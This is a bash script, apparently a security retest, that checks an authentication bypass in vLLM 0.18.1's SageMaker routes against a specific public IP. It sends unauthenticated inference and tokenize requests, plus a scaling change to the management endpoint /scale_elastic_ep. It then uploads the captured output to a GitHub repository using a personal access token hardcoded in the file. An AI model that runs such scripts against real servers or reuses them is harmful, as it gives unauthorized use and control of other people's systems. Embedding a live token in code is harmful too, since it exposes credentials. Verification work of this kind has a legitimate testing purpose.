#!/bin/bash
# Independent retest of finding 759 / node 8117 — vLLM 0.18.1 SageMaker-route auth bypass
# Clean session: no Authorization / x-api-key / cookie is ever sent.
OUT=/tmp/retest759_out.txt
exec > >(tee -a "$OUT") 2>&1
B=http://123.184.7.135:8000
J='Content-Type: application/json'
TS() { date -u +%Y-%m-%dT%H:%M:%SZ; }

echo "=== RETEST759 START $(TS)"
echo "=== runner: $(hostname) $(uname -srm)"
echo "=== runner egress IP: $(curl -s -m 10 https://api.ipify.org)"
echo "=== VANTAGE CONTROL (non-target reachability): $(curl -s -m 10 -o /dev/null -w '%{http_code}' https://example.com)"
echo "=== auth-header grep in script: $(grep -ciE 'authorization|x-api-key' "$0")"

req() {
  local label="$1" method="$2" path="$3" body="$4"
  echo
  echo "--- [$label] $(TS) $method $B$path"
  if [ -n "$body" ]; then
    curl -sS -m 30 -X "$method" -H "$J" -D /tmp/h.$$ -o /tmp/b.$$ -d "$body" "$B$path"; local rc=$?
  else
    curl -sS -m 30 -X "$method" -D /tmp/h.$$ -o /tmp/b.$$ "$B$path"; local rc=$?
  fi
  echo "curl_rc=$rc"
  echo "RESP_HEADERS:"; sed -n '1,12p' /tmp/h.$$
  echo "RESP_BYTES=$(wc -c < /tmp/b.$$)"
  echo "RESP_BODY_RAW:"; head -c 1200 /tmp/b.$$; echo
  rm -f /tmp/h.$$ /tmp/b.$$
}

echo
echo "=== STEP 1: unauthenticated route inventory / version / model"
req version      GET  "/version"
curl -sS -m 20 -o /tmp/o.$$ -w 'openapi.json -> HTTP %{http_code} bytes %{size_download}\n' "$B/openapi.json"
echo "openapi paths (first 30):"; grep -oE '"/(v1|inference|tokenize|detokenize|invocations|scale_elastic_ep|is_scaling_elastic_ep|load|metrics|version|health|ping)[a-z0-9_/{}]*"' /tmp/o.$$ | sort -u | head -30
rm -f /tmp/o.$$
echo "metrics model_name line:"; curl -sS -m 20 "$B/metrics" | grep -oE 'model_name="[^"]+"' | sort -u | head -3

echo
echo "=== STEP 2: NEGATIVE CONTROL — protected OpenAI routes must reject anonymously"
req n1_v1_models      GET  "/v1/models"
req n2_v1_load_lora   POST "/v1/load_lora_adapter" '{}'

echo
echo "=== STEP 3: KEY BEHAVIOUR — unauthenticated inference"
req p1_invocations POST "/invocations" '{"model":"qwen3.8-27b","messages":[{"role":"user","content":"say hi"}],"max_tokens":4}'

echo
echo "=== STEP 4: KEY BEHAVIOUR — unauthenticated tokenize"
req p2_tokenize POST "/tokenize" '{"model":"qwen3.8-27b","prompt":"hello"}'

echo
echo "=== STEP 5: AUTH DIFFERENTIAL, SAME EMPTY BODY SHAPE"
req d1_scale_ep_empty   POST "/scale_elastic_ep" '{}'
req d2_is_scaling_ep    POST "/is_scaling_elastic_ep" '{}'

echo
echo "=== STEP 6: management route with valid body (size 1 = previously observed value)"
req p3_scale_ep_size1 POST "/scale_elastic_ep" '{"new_data_parallel_size":1}'

echo
echo "=== RETEST759 END $(TS)"
sleep 2
# publish raw output back to the repo so it can be read via the contents API
python3 - <<'PY'
import base64,json,urllib.request,os,datetime
T="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";R="dongsuju/ul-plant"
path="ul759/out/retest759_%s.txt"%datetime.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
op=urllib.request.build_opener(urllib.request.ProxyHandler({}))
def api(u,data=None,method="GET"):
    req=urllib.request.Request("https://api.github.com"+u,data=json.dumps(data).encode() if data is not None else None,method=method)
    req.add_header("Authorization","token "+T);req.add_header("Accept","application/vnd.github+json");req.add_header("Content-Type","application/json")
    try:
        with op.open(req,timeout=90) as r: return r.status,json.loads(r.read().decode() or "{}")
    except urllib.error.HTTPError as e: return e.code,e.read().decode()[:200]
body={"message":"ul759: retest output","content":base64.b64encode(open("/tmp/retest759_out.txt","rb").read()).decode(),"branch":"main"}
print("PUBLISH", path, api("/repos/%s/contents/%s"%(R,path),body,"PUT")[0])
PY
